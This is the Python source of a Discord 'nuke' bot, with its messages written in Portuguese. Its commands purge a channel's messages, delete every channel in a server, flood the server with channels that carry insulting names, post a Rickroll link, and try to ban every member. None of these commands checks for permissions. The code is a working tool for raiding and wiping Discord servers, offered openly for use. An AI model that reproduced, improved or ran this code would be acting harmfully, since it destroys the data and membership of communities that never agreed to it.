import os
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.members = True

TOKEN = open("TOKEN.txt", "r").read()
bot = commands.Bot(intents=intents,command_prefix='!', help_command=None)
activity = discord.Game(name="Cuidado com o RickRoll")
GUILD = os.getenv("DISCORD_GUILD")

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.do_not_disturb, activity=activity)

    print(f"{bot.user} ON-LINE")
    print("")
    print("-="*50)
    print("")

    print("Servidores")
    for guid in bot.guilds:
        print(">> ",guid)
        for member in guid.members:
            print("Membros: ",member)
        if guid.name == GUILD:
            break

    #members = "\n - ".join([member.name for member in guid.members])

    print("")
    print("-="*50)

@bot.event
async def on_member_join(member):
    try:
        await member.create_dm()
        await member.dm_channel.send(f"Obrigado por entrar no **NOSSO** servidor")
    except:
        print("Erro ao mandar mensagem na DM")

@bot.command()
async def help(ctx):
    print("Help usado")
    HelpEmbed = discord.Embed(title="Ajuda pro Noob", description="Ve a ajudinha ai, NOOB")
    HelpEmbed.add_field(name="clear", value="Deleta TODAS as mensagens do canal atual", inline=False)
    HelpEmbed.add_field(name="nuke", value="Deleta TODOS os canais e adiciona um novinho em folha", inline=True)
    HelpEmbed.add_field(name="createchannel <Quantidade>", value="Cria canais 😎🤙", inline=False)
    HelpEmbed.add_field(name="banall", value="Da um BAN gostoso em TODOS os usuarios, não incluindo pessoas com Mais PODER, como DONO, e administradores,", inline=False)
    HelpEmbed.add_field(name="newnuke <Quantidade>", value="Destroi todos os canais e em seguida cria novos canais")

    HelpEmbed.set_author(name="Autor: ChickChuck2#4645", icon_url="https://cdn.discordapp.com/avatars/462768330005282816/a_a02c469e8e8948276e66a40b068f0ce0.gif?size=4096")
    HelpEmbed.set_thumbnail(url="https://cdn.discordapp.com/attachments/770285147022032896/869613093372710942/NewCanvas1.png")
    #HelpEmbed.set_image(url="https://cdn.discordapp.com/attachments/770285147022032896/869613093372710942/NewCanvas1.png")
    #HelpEmbed.set_footer(text="OLÁ")
    await ctx.channel.send(embed=HelpEmbed)

@bot.command()
async def clear(ctx):
    print("Clear Usado")
    await ctx.channel.purge(limit=60000)

@bot.command()
async def createchannel(ctx, Quantidade):
    print("createchannel usado")
    quanti = int(Quantidade)
    guild = ctx.message.guild

    for i in range(quanti):
        await guild.create_text_channel(f"Canal{i}")

@bot.command()
async def nuke(ctx):
    print("nuke usado")
    guild = ctx.message.guild

    for c in ctx.guild.channels:
        await c.delete()
    
    await guild.create_text_channel("Never gonna give you up")

    for rickroll in ctx.guild.channels:
        await rickroll.send("https://youtu.be/dQw4w9WgXcQ")

@bot.command()
async def newnuke(ctx, quantidade):
    print("new nuke usado")
    guild = ctx.message.guild

    for c in ctx.guild.channels:
        await c.delete()
        for i in range(int(quantidade)):
            await guild.create_text_channel(f"vai se foder Shyzuka Amor {i}")

@bot.command()
async def banall(ctx):
    print("banall usado")
    for user in ctx.guild.members:
        try:
            await user.ban()
            await ctx.send(f"✅ {user} BANIDO!")
        except:
            await ctx.send(f"❌ {user} Não banido")
            pass

bot.run(TOKEN)